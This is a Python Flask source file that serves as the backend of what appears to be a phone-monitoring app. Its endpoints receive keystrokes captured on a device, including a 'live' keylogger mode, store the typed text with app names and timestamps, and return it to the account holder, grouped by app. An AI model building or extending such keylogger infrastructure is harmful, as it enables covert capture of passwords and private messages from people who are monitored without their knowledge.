from flask import Blueprint, request, jsonify, current_app
from datetime import datetime
from sqlalchemy.exc import SQLAlchemyError
from models.devices import Keystroke
from config.database import db
from utils.ownership import require_device_ownership, require_body_ownership

keystrokes_bp = Blueprint('keystrokes', __name__)


@keystrokes_bp.route('/keystrokes', methods=['POST'])
@require_body_ownership
def save_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        keystrokes_data = data.get('keystrokes', [])

        if not device_id or not keystrokes_data:
            return jsonify({'error': 'Missing device ID or keystrokes data'}), 400

        for keystroke in keystrokes_data:
            new_keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke.get('package_name'),
                text=keystroke.get('text'),
                event_type=keystroke.get('event_type'),
                timestamp=datetime.fromtimestamp(
                    keystroke.get('timestamp') / 1000.0)
            )
            db.session.add(new_keystroke)

        db.session.commit()
        return jsonify({'message': 'Keystrokes saved successfully'}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/keystrokes/live', methods=['POST'])
@require_body_ownership
def save_live_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        keystrokes_data = data.get('keystrokes', [])
        is_live_mode = data.get('live_mode', False)

        if not device_id:
            return jsonify({'error': 'Missing device ID'}), 400

        if not keystrokes_data:
            return jsonify({'error': 'Missing keystrokes data'}), 400

        for keystroke in keystrokes_data:
            timestamp_ms = keystroke.get('timestamp', int(datetime.now().timestamp() * 1000))
            try:
                timestamp = datetime.fromtimestamp(timestamp_ms / 1000.0)
            except Exception:
                timestamp = datetime.now()

            new_keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke.get('package_name'),
                text=keystroke.get('text'),
                event_type=keystroke.get('event_type'),
                timestamp=timestamp
            )
            db.session.add(new_keystroke)

        db.session.commit()

        return jsonify({
            'message': 'Live keystrokes saved successfully',
            'keystrokes_saved': len(keystrokes_data),
            'live_mode': is_live_mode
        }), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/keylogger-status', methods=['POST'])
@require_body_ownership
def update_keylogger_status():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        status = data.get('status')

        if not device_id or not status:
            return jsonify({'error': 'Missing device ID or status'}), 400

        return jsonify({'message': f'Keylogger status updated to: {status}'}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/local-keystrokes', methods=['POST'])
@require_body_ownership
def save_local_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        keystrokes_data = data.get('keystrokes', [])

        if not device_id or not keystrokes_data:
            return jsonify({'error': 'Missing device ID or keystrokes data'}), 400

        Keystroke.query.filter_by(device_id=device_id).delete()

        for keystroke in keystrokes_data:
            new_keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke.get('package_name'),
                text=keystroke.get('text'),
                event_type=keystroke.get('event_type'),
                timestamp=datetime.fromtimestamp(
                    keystroke.get('timestamp') / 1000.0)
            )
            db.session.add(new_keystroke)

        db.session.commit()
        return jsonify({'message': 'Local keystrokes saved successfully'}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/device/<device_id>/keystrokes', methods=['GET'])
@require_device_ownership
def get_device_keystrokes(device_id):
    try:
        since_timestamp = request.args.get('since')
        query = Keystroke.query.filter_by(device_id=device_id)

        if since_timestamp:
            try:
                since_timestamp = int(since_timestamp)
                since_datetime = datetime.fromtimestamp(since_timestamp / 1000.0)
                query = query.filter(Keystroke.timestamp > since_datetime)
            except (ValueError, TypeError):
                pass

        keystrokes = query.order_by(Keystroke.timestamp.desc()).all()
        return jsonify([keystroke.to_dict() for keystroke in keystrokes]), 200

    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/device/<device_id>/keystrokes/apps', methods=['GET'])
@require_device_ownership
def get_device_keystrokes_by_app(device_id):
    try:
        keystrokes = Keystroke.query.filter_by(device_id=device_id)\
            .order_by(Keystroke.package_name, Keystroke.timestamp.desc()).all()

        apps_data = {}
        for keystroke in keystrokes:
            if keystroke.package_name not in apps_data:
                apps_data[keystroke.package_name] = []
            apps_data[keystroke.package_name].append(keystroke.to_dict())

        return jsonify(apps_data), 200

    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500


@keystrokes_bp.route('/device/<device_id>/keylogger/status', methods=['GET'])
@require_device_ownership
def get_keylogger_status(device_id):
    try:
        return jsonify({
            'device_id': device_id,
            'live_mode': False,
            'timestamp': datetime.now().timestamp() * 1000
        }), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500
